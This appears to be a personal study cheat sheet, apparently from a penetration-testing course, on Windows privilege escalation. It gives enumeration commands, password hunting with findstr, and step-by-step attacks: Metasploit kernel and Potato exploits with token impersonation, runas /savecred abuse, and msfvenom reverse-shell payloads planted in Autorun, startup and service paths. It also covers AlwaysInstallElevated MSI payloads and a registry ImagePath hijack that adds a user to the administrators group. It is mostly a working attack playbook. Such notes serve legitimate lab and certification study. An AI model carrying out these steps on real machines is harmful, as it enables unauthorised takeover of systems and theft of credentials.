# Priv Esc Sheet
## Links from tcm-sec
https://fuzzysecurity.com/tutorials/16.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html


### https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources

## Enum after post-exploit
### System Enumeration

1. systeminfo 
2. systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
3. hostname
4. wmic qfe <-- may or may not work
5. wmic logical disk <-- will be messy 
6. wmic logical disk get caption,description,providername

### User Enumeration
1. whoami
2. whoami /priv
3. whoami /groups
4. net user
5. net user username
6. net localgroup <-- may or maynot work
7. net localgroup  knowngroupname

### Network Enumeration
1. ipconfig
2. arp -a
3. route print
4. netstat -ano

### Password Hunting
1. findstr /si password \*.txt \*.ini \*.config
2.https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords

### AV Enum
1. sc query windefend
2. sc queryex type= service
3. netsh advfirewall firewall dump
4. netsh firewall show state
5. netsh firewall show config

## Automated Enum

![image](https://user-images.githubusercontent.com/115465242/199896061-c24eb57c-c018-4ef1-8ff2-c669acb7d2e6.png)

# EXPLOITS

## KERNEL EXPLOIT

### using msfconsole
https://github.com/SecWiki/windows-kernel-exploits
1. meterpreter  -> run post/multi/recon/local_exploit_suggester
2.  if kitrapod is there use it or else look on the exploits suggested by msf
3.  use exploit/windows/local/ms10_015_kitrap0d
4.  set options 
5.  run 
6.  get shell 

### Manual 
1. ./windows-exploit-suggester.py --update 
2. convert the xls file to xlsx and then again to xls for this shit to work
3. do  "systeminfo" on the victim machine copy it to attack machine 
4. ./windows-exploit-suggester.py --database xlsFlie --systeminfo sysInfoFile
5. and the look through the results

## Windows subsystem for linux

1. dir "wsl.exe" /s
2. cd to dir
3. wsl.exe whoami
4. dir "bash.exe" /s
5. cd to dir 
6. do bash.exe 
7. get the tty shell 
8. do linux privesc

## Potato Attack
1. whoami /priv -> SeImpersonatePrivilege        Impersonate a client after authentication   **Enabled**
2. msfconsole
3. use exploit/multi/script/web_delivery
4. set options 
5. set target with pwrshell if python not present
6. change payload if it is not working
7. copy the generated code and paste it in the window shell
8. we will get a connection
9. do sysinfo
10. background
11. use post/multi/recon/local_exploit_suggester to look for exploits ```ms_16_075_reflection``` or ```ms_16_075_reflection_juicy```
12. following steps are only for reflection and not reflection_juicy, we can get a system shell directly from juicy
14. if the meterpreter shell is x86 and system is x64
15. do ps
16. migrate to any service or process running on x64
17. do sessions to check if there is a x64 meterpreter shell
18. now use exploit/windows/local/scripts/ms16_075_reflection
19. set options
20. run ->get a new meterpreter shell
21. do load incognito
22. list_tokens -u
23. impersonate_token "Token Name"
24. done

## RunAs escalation
1. cmdkey /list
2. C:\Windows\System32\runas.exe /user:User /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"

## Registry Escalation

### Auto Run
1. C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
2. Look for progs with path as  "C:\Program Files\Autorun Program"
3. then in cmd do C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
4. We are looking for something like this

![image](https://user-images.githubusercontent.com/115465242/201464618-c9d8ba37-15bb-4631-9478-35e53048735b.png)

5. **OR WE CAN USE powerup.ps1**
    1. powershell -ep bypass
    2. . .\PowerUp.ps1
    3. Invoke-AllChecks
    4. there we can find the same from above

6. use msfvenom to get a windows/meterpreter/reverse_shell payload with the same name as that of program
7. configure msfconsole to start a listener
8.  put the payload in the location 
9.  Ideally the payload should get run by it self if the auth system logs in.

### AlwaysInstallElevated
1. reg query HKLM\Software\Policies\Microsoft\Windows\Installer

![image](https://user-images.githubusercontent.com/115465242/201473227-3cb88387-e3b0-42f6-a98a-d1f8a47220f3.png)

2. We are looking for something like this\!
3. if we run powerup.ps1 and get Write-UserAddMSI as vuln 
4. type Write-UserAddMSI is powershell and we will get a setup if we run that 
5. a user with administrative privileges will be made with a given pass, we can switch to that user and use it as admin

**OR**

1. We can make a .msi payload through msfvenom and start a listener
2. Rather than saving the file straight up run the payload it should get installed and run as Authority

**OR**
1. we can use exploit/windows/local/always_install_elevated
 
 ## Service Escalation - Registry
 1. Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
 2. We are looking for something like this

![image](https://user-images.githubusercontent.com/115465242/201506805-2487d212-2f8b-458b-a53a-5f3c6067a73b.png)

 3. now on attack machine we have windows_service.c 
 4. gedit that
 5. add this to system() -> cmd.exe /k net localgroup administrators **username** /add
 6. compile it using ->  x86_64-w64-mingw32-gcc windows_service.c -o x.exe
 7. using ftp or http transfer to attack machine and then move it to C:\Temp
 8. then through cmd do ->  reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
 9. do sc start regsvc 
 10. net localgroup administrators -> user as administrator 


**NOTE**: cmd on 9th will only work on a cmd shell and not powershell


## Executeable Files
Download accesschk64.exe put in C:\Users\User\Desktop\Tools<br>
1. C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"

2. We are looking for something like this
![image](https://user-images.githubusercontent.com/115465242/201575835-835e4ed1-03db-45cc-bb3f-224085539175.png)

3. we can also run powerup to get the same results

![image](https://user-images.githubusercontent.com/115465242/201576163-0b6872a2-e5ae-4dac-886a-f353b12621be.png)

4. Follow step 4-6 from **Service Escalation - Registry** 
5. transfer it to the vuln path with same name as vuln process
6. net localgroup administrators
7. sc start servicename
8. net localgroup administrators

## Startup Applications Overview
DOWNLOAD icacls.exe save in ~/Desktop/tools, transfer to windows victim machine.<br>
1.  icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
2.  We are looking for \<F\>
![image](https://user-images.githubusercontent.com/115465242/201578426-2225f4af-afdc-43a7-aeec-509dacc4189c.png)
3. Generate a windows/meterpreter/reverse_tcp , .exe payload 
4. wait for the some admin to log in

# DLL Hijacking 

1. Using powersploit or winPEAS check if there a service or prog with some dll not found
